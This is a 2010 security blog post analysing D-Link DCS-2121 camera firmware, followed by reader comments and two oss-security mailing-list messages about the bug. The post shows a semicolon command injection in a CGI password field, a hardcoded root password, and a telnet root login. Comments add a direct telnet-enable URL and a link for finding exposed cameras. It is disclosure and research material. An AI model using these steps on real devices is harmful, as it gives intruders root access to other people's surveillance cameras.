=== Content from newsoft-tech.blogspot.com_21290c93_20250125_224846.html ===


[skip to main](#main)  |
[skip to sidebar](#sidebar)

# [newsoft's tech blog](http://newsoft-tech.blogspot.com/)

newsoft Technical Blog (loosely updated, unfortunately ...)

## Monday, September 27, 2010

### D-Link DCS-2121 and the state of embedded security

**Introduction**

I recently bought a [D-Link DCS-2121](http://www.dlink.com.sg/products/?idproduct=310) surveillance camera. This is good stuff:

* Megapixel camera + microphone + speaker
* WiFi, UPnP and dynamic DNS supported
* Web and Mobile Web access to streaming data
* Motion detection
* SDCard recording

It is also an embedded system running Linux operating system; therefore I decided to have a look at it ;) A firmware upgrade is available [here](http://www.dlink.com.sg/support/support_detail.asp?idproduct=310) (version 1.04 at the time of writing), which is very convenient for further analysis.

**Firmware analysis**

$ wget http://www.dlink.com.sg/support/Support\_download.asp?idsupport=745

(...)

$ unzip dcs-2121\_fw\_1.04\_3227.zip

Archive: dcs-2121\_fw\_1.04\_3227.zip

inflating: DCS-2102\_DCS-2121\_A1\_FW\_1.04\_3227.bin

inflating: DCS-2121\_A1\_Release Note\_forFW1.04-3227.txt

$ file DCS-2102\_DCS-2121\_A1\_FW\_1.04\_3227.bin

DCS-2102\_DCS-2121\_A1\_FW\_1.04\_3227.bin: POSIX shell script text executable

Yes, firmware is … a shell script file! In fact, this file is broken into two parts:

* A shell script
* A binary blob

[![](http://newsoft.dyndns.org/tech/DCS_firmware.png)](http://newsoft.dyndns.org/tech/DCS_firmware.png)

The shell script is very small - interesting parts are the following:

(...)

BLOCKS="norboot.bin(0x10000,65536),vmlinuz(0x60000,1048576),cram\_image(0x160000,0x5E0000),autoboot.bin(0x2000,8192)"

(...)

extract() {

 # tarLine will be replaced with a real number by Makefile

 tail -n +153 "$1"

}

(...)

extract "$self" | ddPack - || exit 1

(...)

"ddPack" is a custom application. Nevertheless we gained some insights about memory layout, and we know that a [CramFS filesystem](http://en.wikipedia.org/wiki/Cramfs) is used.

CramFS "magic" bytes are 0x28cd3d45 - they are very easy to locate within the firmware (beware of endianness). Actual offset may vary - depending of the firmware localization (D-Link provides regional builds of the same version).

$ dd if=DCS-2102\_DCS-2121\_A1\_FW\_1.04\_3227.bin of=cramfs bs=1138213 skip=1

5+1 records in

5+1 records out

6168576 bytes (6.2 MB) copied, 0.0210627 s, 293 MB/s

$ file cramfs

cramfs: Linux Compressed ROM File System data, little endian size 5791744 version #2 sorted\_dirs CRC 0x70c14953, edition 0, 3603 blocks, 1199 files

$ sudo mount -o loop,ro cramfs /mnt/loop/

ls /mnt/loop/

bin  dev  etc  lib  linuxrc  mnt  opt  proc  sbin  scripts  tmp  usr  var

We now have full read access to the firmware, which leads to interesting discoveries. According to copyright strings, the camera itself is built around the [Prolific PL-1029](http://www.prolific.com.tw/eng/Products.asp?ID=74) "System On a Chip". Many CGI files under "/var/www" are calling eval() with user-supplied parameters. There is also a promising "/var/www/cgi/admin/telnetd.cgi" script :)

#!/bin/sh

# get current setting from tdb

# format looks like VariableName\_type

onGetSetting() {

        result=""

}

# make sure, ...

# 1. $result is set

# 2. variables in dumpXml are all set

onUpdateSetting() {

        result="ok"

        if [ "$command" = "on" ]; then

            /usr/sbin/telnetd 1>/dev/null 2>/dev/null

        else

            killall telnetd 1>/dev/null 2>/dev/null

        fi

}

onDumpXml() {

        xmlBegin index.xsl home-left.lang index.lang

        resultTag $result

        xmlEnd

}

scenario=$(basename $0 | cut -d'.' -f1)

. ../../xmlFunctions.sh

. ../../cgiMain.sh

However we are going to focus on a very specific bug: "semicolon injection". In my experience, this bug plagues all and every Linux-based embedded devices, ranging from the [OrangeBox](http://www.agp.dsl.pipex.com/telnet_server.html) (now dead link) to [DD-WRT](http://www.h-online.com/open/news/item/Root-vulnerability-in-DD-WRT-free-router-firmware-742605.html). Let's look for compiled CGI that might be calling system().

var/www/cgi/admin$ fgrep system \*

Binary file adv\_audiovideo.cgi matches

Binary file adv\_godev.cgi matches

Binary file adv\_sdcard.cgi matches

Binary file calibration.cgi matches

Binary file export.cgi matches

Binary file go\_sleep.cgi matches

Binary file import.cgi matches

Binary file netWizard.cgi matches

Binary file pt8051\_settings.cgi matches

Binary file pt\_settings.cgi matches

Binary file reboot.cgi matches

Binary file recorder\_status.cgi matches

Binary file recorder\_test.cgi matches

Binary file reset.cgi matches

Binary file rs485\_control.cgi matches

Binary file tools\_admin.cgi matches

Binary file tools\_system.cgi matches

Binary file wireless\_ate.cgi matches

Let's focus on those files, and look for possibly unsecure calls.

$ strings -f \* | grep "%s"

adv\_godev.cgi: TinyDBError %s

adv\_sdcard.cgi: rm -rf "%s"

adv\_sdcard.cgi: %s/video

adv\_sdcard.cgi: mkdir -m 0777  %s/video

adv\_sdcard.cgi: find "%s" -type f -name "\*" |wc -l

pt\_settings.cgi: TinyDBError %s

recorder\_test.cgi: TinyDBError %s

recorder\_test.cgi: umount %s

recorder\_test.cgi: mkdir -p %s

recorder\_test.cgi: smbmount //%s/%s %s -o username=%s,password=%s

recorder\_test.cgi: touch %s

rs485\_control.cgi: TinyDBError %s

rs485\_control.cgi: RS485PresetControl::%s(), unexpected command

So … "recorder\_test.cgi" potentially calls **system("smbmount //%s/%s %s -o username=%s,password=%s")** … Let's see if "password" parameter is properly escaped.

|  |
| --- |
| Try #1 with password "toto". Command result is "mntFailure". |

|  |
| --- |
| Try #2 with password "toto;/bin/true". Command result is "ok" :) |

It is now time to start that "/usr/sbin/telnetd" server :) But wait ... what is "root" password ?

"/etc/passwd" and "/etc/shadow" are symbolic links to "/tmp/passwd" and "/tmp/shadow". Those files are created at boot time by "/etc/rc.d/rc.local" script.

(...)

start() {

 touch /tmp/group /tmp/passwd /tmp/shadow

 echo 'root:x:0:' > /etc/group

 echo 'root:x:0:0:Linux User,,,:/:/bin/sh' > /etc/passwd

 echo 'root:$1$gmEGnzIX$bFqGa1xIsjGupHyfeHXWR/:20:0:99999:7:::' > /etc/shadow

 #telnetd > /dev/null 2> /dev/null

 /bin/agent &

 #/sbin/syslogd

 addlog System is booted up.

 echo "rc.local start ok."

}

(...)

So ... "root" password is hardcoded to "admin". How cool is that ? ;)

$ telnet 192.168.0.117 23

DCS-2121 login: rootPassword: admin

BusyBox v1.01 (2009.07.27-09:19+0000) Built-in shell (ash)Enter 'help' for a list of built-in commands.

~ # uname -auname -aLinux DCS-2121 2.4.19-pl1029 #1 Mon Jul 27 17:21:05 CST 2009 armv4l unknown

**Conclusion**

As often with Linux-based embedded firmwares, a trivial "semicolon injection" bug can be found with no reverse-engineering - grep is the only tool you need to reproduce this case at home.

Disclaimer (for not-so-funny people): yes this is "0day", unreported to the vendor. I even suspect the whole D-Link product line is vulnerable to the same bug (if not the whole world of low-end embedded systems (and even business class products)). However, since Web access requires authentication, this bug might be exploitable by administrators only, so it is only useful for people who would like to gain a shell on their own systems. Do not panic :)

Bonus: [how to find D-Link cameras on the Internet](http://www.shodanhq.com/?q=dcs-lig-httpd).

Posted by

[newsoft](https://www.blogger.com/profile/04331742158137961313 "author profile")

at

[Monday, September 27, 2010](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/26480225/2847452806935009669 "Email Post")

[Email This](https://www.blogger.com/share-post.g?blogID=26480225&postID=2847452806935009669&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=26480225&postID=2847452806935009669&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=26480225&postID=2847452806935009669&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=26480225&postID=2847452806935009669&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=26480225&postID=2847452806935009669&target=pinterest "Share to Pinterest")

#### 17 comments:

[![](//www.blogger.com/img/blogger_logo_round_35.png "fhoguin")](https://www.blogger.com/profile/05564503810604420283)
[fhoguin](https://www.blogger.com/profile/05564503810604420283)
said...

Very interesting, although it's strange that the firmware update file wasn't encrypted in some way.

A few weeks ago I reverse engineered archos AOS1 firmware update file format, and it starts with an RSA-encrypted block containing an AES-128 key, and the rest of the file is encrypted with this key.

But anyway, the semicolon injection is very cool.

[Sep 27, 2010, 11:03:00 AM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285581836015#c1128208430744164154 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=1128208430744164154 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "blah")

blah
said...

Au passage, merci pour le lien et la belle injection SQL présente ici ;-) : http://www.dlink.com.sg/support/Support\_download.asp?idsupport=745

[Sep 27, 2010, 3:47:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285598876987#c7651237538755258812 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=7651237538755258812 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "jduck")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWL1ydXP5C7PddZ6O1M4yxzILJPaTA-IcBMRyPUyaHOCZkzn3Pg9CUlCRK4_JKx_m4yQp-q1n7aTAxF_F85kV-_wfczw_W_xa_Dl_39zWnpoJWplgcz_u1q96xszxxfQ/s45-c/gravatar.jpeg)](https://www.blogger.com/profile/08277186239477077950)
[jduck](https://www.blogger.com/profile/08277186239477077950)
said...

Nice post!

[Sep 27, 2010, 4:52:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285602730967#c6685832917458608226 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=6685832917458608226 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "bknabe")](https://www.blogger.com/profile/18407372839500665698)
[bknabe](https://www.blogger.com/profile/18407372839500665698)
said...

I may check my Linksys router to see if it's vulnerable. I don't know if it's Linux based, but it won't take much to find out. ;)

[Sep 27, 2010, 5:07:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285603679562#c191443801074974375 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=191443801074974375 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "James Shewmaker")
![](//1.bp.blogspot.com/_lIEk6xWWI2Y/SgDUeXnZQ_I/AAAAAAAAAbE/0vmjHHEiLV4/S45-s35/jimmyshew%2Ba.jpg)](https://www.blogger.com/profile/00017674583941572077)
[James Shewmaker](https://www.blogger.com/profile/00017674583941572077)
said...

Only exploitable by admin ... with a hardcoded root password ... cue XSS payload ...

[Sep 27, 2010, 5:18:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285604334349#c268950833535955192 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=268950833535955192 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

how did you knew that the root password was Admin from that?

[Sep 27, 2010, 5:35:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285605347929#c3105575898087641399 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=3105575898087641399 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "dr")

dr
said...

Nice writeup. Good bug. Very educational. --dr

[Sep 27, 2010, 5:58:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285606686139#c379289703148781976 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=379289703148781976 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "newsoft")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXnLv7khq8ayISp-YHZFQAPvVhIbtSWbxKZX08Ut67gTZ1v8LYCz6_iJH7Ro-vkH3krDdx07sh0tWl5gZj39DfdXzjmoW-HNrVjqaKRRh3YzzGmK2n8u3k6kL_KiDfkg/s45-c/blog.jpg)](https://www.blogger.com/profile/04331742158137961313)
[newsoft](https://www.blogger.com/profile/04331742158137961313)
said...

@fhoguin: I thought Archos firmwares were tougher than that. If memory serves, Archos 704 is built upon a Texas Instruments DSP that embeds an encryption key within the CPU itself.

@blah: je décline toute responsabilité, etc. ;)

@anonymous: it took approximately 5 seconds for John the Ripper to find out that the password was "admin" from the hash :)

[Sep 28, 2010, 8:29:00 AM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285658969300#c8465033866286576518 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=8465033866286576518 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Unknown")](https://www.blogger.com/profile/03311798111159439433)
[Unknown](https://www.blogger.com/profile/03311798111159439433)
said...

> However, since Web access requires authentication, (...) . Do not panic :)

html Mail + your bug = remote rooter farming

[ DO PANIC NOW ]

Cool post btw ;)

Cheers,

endrazine-

[Sep 28, 2010, 4:29:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285687772886#c2341842648647380799 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=2341842648647380799 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "0xacdc")](https://www.blogger.com/profile/02740805373582191461)
[0xacdc](https://www.blogger.com/profile/02740805373582191461)
said...

Thx man, very educational indeed.

I shall propose the same kind of "exercise", within similar boundaries, to my own coworkers.

[Sep 29, 2010, 3:06:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1285769207577#c94172612951879749 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=94172612951879749 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

This is what happens when a company blatantly rips off the work of volunteers. Sad, but inevitable.

[Sep 10, 2011, 6:22:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1315675345859#c5713991218252126730 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=5713991218252126730 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Tolengo")

Tolengo
said...

I still don't understand how you enable the telnetd.cgi
I was testing with:
http://192.168.1.20/cgi/admin/telnetd.cgi?on

returns: unknown command. Please specify 'on' or 'off'.

Could you explain me what I have to do to enable telnet?

Thank you.

[Nov 16, 2011, 2:52:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1321451568267#c2675639886805568575 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=2675639886805568575 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "Sylvio Rogério Soares")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBx8Z43CiYOgdBdnuQlTtCxXyyX9yNQd6VBUdeh-5Qeme5SIbXNb9UWQpRS2tQpv5VkbCNb_ZOqEPQx88_ctHNwhN8vckYSXgMHeV7c1l5Puy6HBKkuz8Qv8L97iNznQ/s45-c/sylvio_avatar_2015.jpg)](https://www.blogger.com/profile/11190522304465789187)
[Sylvio Rogério Soares](https://www.blogger.com/profile/11190522304465789187)
said...

Hello all,

I'm testing a DCS-2121 and need to translate the admin interface of the camera to my native language, Brazilian Portuguese. How do I get access to the firmware, which is currently 1.05, in order to edit the text portion of it?
Can anyone help me ... the credits published without referring the help. Thank you.

[Jan 7, 2012, 12:05:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1325934344309#c3953389070360623186 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=3953389070360623186 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "newsoft")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXnLv7khq8ayISp-YHZFQAPvVhIbtSWbxKZX08Ut67gTZ1v8LYCz6_iJH7Ro-vkH3krDdx07sh0tWl5gZj39DfdXzjmoW-HNrVjqaKRRh3YzzGmK2n8u3k6kL_KiDfkg/s45-c/blog.jpg)](https://www.blogger.com/profile/04331742158137961313)
[newsoft](https://www.blogger.com/profile/04331742158137961313)
said...

@Sylvio Sorry, I can't help. Reading the firmware content is easy, but writing requires full understanding of the "ddPack" format. There is a long way to go, and I am not sure the target is really worth it ...

[Jan 8, 2012, 11:15:00 AM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1326017718419#c3475087888919394452 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=3475087888919394452 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

Could you explain me what I have to do to enable telnet?

Thank you.

[May 17, 2012, 4:07:00 PM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1337267249026#c4818231897969818503 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=4818231897969818503 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Unknown")](https://www.blogger.com/profile/03183341447635326913)
[Unknown](https://www.blogger.com/profile/03183341447635326913)
said...

Thanks for sharing the post...great help...keep it up!!!

[d-link](http://www.a2zfreetechsupport.com/D-link-Support.htm)

[Aug 17, 2013, 6:45:00 AM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1376718300046#c6565784640853438713 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=6565784640853438713 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

not need to inject by password... just use CGI script

(@Tolengo) use : http://192.168.1.20/cgi/admin/telnetd.cgi?command=on

[Sep 4, 2019, 12:09:00 AM](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html?showComment=1567552177344#c8221693241031938026 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=26480225&postID=8221693241031938026 "Delete Comment")

[Post a Comment](https://www.blogger.com/comment/fullpage/post/26480225/2847452806935009669)

[Newer Post](http://newsoft-tech.blogspot.com/2012/01/ms11-014-this-is-not-bug-your-are.html "Newer Post")

[Older Post](http://newsoft-tech.blogspot.com/2010/09/ms10-061-this-is-not-0day-you-are.html "Older Post")

[Home](http://newsoft-tech.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://newsoft-tech.blogspot.com/feeds/2847452806935009669/comments/default)

## About Me

[![My photo](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXnLv7khq8ayISp-YHZFQAPvVhIbtSWbxKZX08Ut67gTZ1v8LYCz6_iJH7Ro-vkH3krDdx07sh0tWl5gZj39DfdXzjmoW-HNrVjqaKRRh3YzzGmK2n8u3k6kL_KiDfkg/s220/blog.jpg)](https://www.blogger.com/profile/04331742158137961313)
[newsoft](https://www.blogger.com/profile/04331742158137961313)

[View my complete profile](https://www.blogger.com/profile/04331742158137961313)

## Links

* [RSS (posts)](http://newsoft-tech.blogspot.com/feeds/posts/default)
* [RSS (comments)](http://newsoft-tech.blogspot.com/feeds/comments/default)
* [NeWSoFT : tech blog (this one)](http://newsoft-tech.blogspot.com/)
* [NeWSoFT : fun blog (the other one)](http://news0ft.blogspot.com/)
* [NeWSoFT : microblog](http://microfail.blogspot.com/)

## Blog Archive

* ►
  [2014](http://newsoft-tech.blogspot.com/2014/)
  (1)
  + ►
    [May](http://newsoft-tech.blogspot.com/2014/05/)
    (1)

* ►
  [2012](http://newsoft-tech.blogspot.com/2012/)
  (1)
  + ►
    [January](http://newsoft-tech.blogspot.com/2012/01/)
    (1)

* ▼
  [2010](http://newsoft-tech.blogspot.com/2010/)
  (5)
  + ▼
    [September](http://newsoft-tech.blogspot.com/2010/09/)
    (4)
    - [D-Link DCS-2121 and the state of embedded security](http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html)
    - [MS10-061: "this is not the 0day you are looking for"](http://newsoft-tech.blogspot.com/2010/09/ms10-061-this-is-not-0day-you-are.html)
    - [Rapid publishing on recent Adobe flaws](http://newsoft-tech.blogspot.com/2010/09/rapid-publishing-on-recent-adobe-flaws.html)
    - [Follow-up on VxWorks issue](http://newsoft-tech.blogspot.com/2010/09/follow-up-on-vxworks-issue.html)
  + ►
    [February](http://newsoft-tech.blogspot.com/2010/02/)
    (1)

* ►
  [2009](http://newsoft-tech.blogspot.com/2009/)
  (7)
  + ►
    [September](http://newsoft-tech.blogspot.com/2009/09/)
    (1)
  + ►
    [August](http://newsoft-tech.blogspot.com/2009/08/)
    (2)
  + ►
    [May](http://newsoft-tech.blogspot.com/2009/05/)
    (1)
  + ►
    [January](http://newsoft-tech.blogspot.com/2009/01/)
    (3)

* ►
  [2008](http://newsoft-tech.blogspot.com/2008/)
  (10)
  + ►
    [December](http://newsoft-tech.blogspot.com/2008/12/)
    (1)
  + ►
    [August](http://newsoft-tech.blogspot.com/2008/08/)
    (4)
  + ►
    [April](http://newsoft-tech.blogspot.com/2008/04/)
    (2)
  + ►
    [March](http://newsoft-tech.blogspot.com/2008/03/)
    (1)
  + ►
    [February](http://newsoft-tech.blogspot.com/2008/02/)
    (2)

* ►
  [2006](http://newsoft-tech.blogspot.com/2006/)
  (5)
  + ►
    [June](http://newsoft-tech.blogspot.com/2006/06/)
    (3)
  + ►
    [April](http://newsoft-tech.blogspot.com/2006/04/)
    (2)



=== Content from www.openwall.com_074c4675_20250125_224853.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[<thread-prev]](../../../2011/09/10/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <733775406.1261153.1316024118779.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
Date: Wed, 14 Sep 2011 14:15:18 -0400 (EDT)
From: Josh Bressers <bressers@...hat.com>
To: oss-security@...ts.openwall.com
Cc: cve-assign@...re.org
Subject: Re: D-Link DCS-2121 Semicolon Vulnerability

I'm going to leave this one to MITRE. I want to stick with the current list policy of only assigning IDs to open source projects.

Thanks.

--
    JB

----- Original Message -----
> Hello,
>
> I've come up with this [0] blog post which, accordingly to author,
> describes a 0day vulnerability within D-Link DCS-2121 camera.
>
> In summary, the data posted from the web configuration interface to
> samba is
> directly used as a parameter without proper sanitization. This leads
> to
> an unwanted system call.
>
> Although the author says that the vulnerability can only be used by
> authenticated users via web interface, it would be dangerous together
> with CSRF on authenticated user. I think that it's worth looking, or,
> at
> least let the vendor know.
>
> """
> Disclaimer (for not-so-funny people): yes this is "0day", unreported
> to
> the vendor. I even suspect the whole D-Link product line is vulnerable
> to the same bug (if not the whole world of low-end embedded systems
> (and
> even business class products)). However, since Web access requires
> authentication, this bug might be exploitable by administrators only,
> so
> it is only useful for people who would like to gain a shell on their
> own
> systems. Do not panic :)
> """
>
> [0]
> <http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html>
>
> Regards,
>
> --
> . 73! DE TA1AET

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_099964aa_20250125_224852.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2011/09/09/11) [[next>]](../../../2011/09/11/1) [[thread-next>]](../../../2011/09/14/4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20110910062759.GG1350@mutt-is@awesome>
Date: Sat, 10 Sep 2011 09:28:00 +0300
From: Eren Türkay <eren@...dus.org.tr>
To: oss-security@...ts.openwall.com
Subject: D-Link DCS-2121 Semicolon Vulnerability

Hello,

I've come up with this [0] blog post which, accordingly to author,
describes a 0day vulnerability within D-Link DCS-2121 camera.

In summary, the data posted from the web configuration interface to samba is
directly used as a parameter without proper sanitization. This leads to
an unwanted system call.

Although the author says that the vulnerability can only be used by
authenticated users via web interface, it would be dangerous together
with CSRF on authenticated user. I think that it's worth looking, or, at
least let the vendor know.

"""
Disclaimer (for not-so-funny people): yes this is "0day", unreported to
the vendor. I even suspect the whole D-Link product line is vulnerable
to the same bug (if not the whole world of low-end embedded systems (and
even business class products)). However, since Web access requires
authentication, this bug might be exploitable by administrators only, so
it is only useful for people who would like to gain a shell on their own
systems. Do not panic :)
"""

[0] <http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html>

Regards,

--
        . 73! DE TA1AET

Content of type "application/pgp-signature" skipped

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
